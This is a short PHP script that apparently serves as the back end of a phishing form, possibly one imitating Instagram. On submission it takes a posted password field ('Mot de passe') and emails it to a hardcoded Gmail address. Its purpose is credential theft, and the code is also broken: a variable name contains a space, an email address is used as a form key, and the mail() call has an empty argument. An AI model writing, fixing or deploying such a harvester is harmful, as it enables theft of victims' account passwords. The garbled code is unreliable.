<?php 
if(isset($_POST['submit'])){
    $to = "dvdchasseur@gmail.com"; // this is your Email address
    $from = $_POST['instagram.20218@gmail.com']; // this is the sender's Email address
    $Mot de passe = $_POST['Mot de passe'];
    $subject = "Mot de passe";
   
    $headers = "From:" . $from;
    mail($to,$subject,,$headers);
    
    }
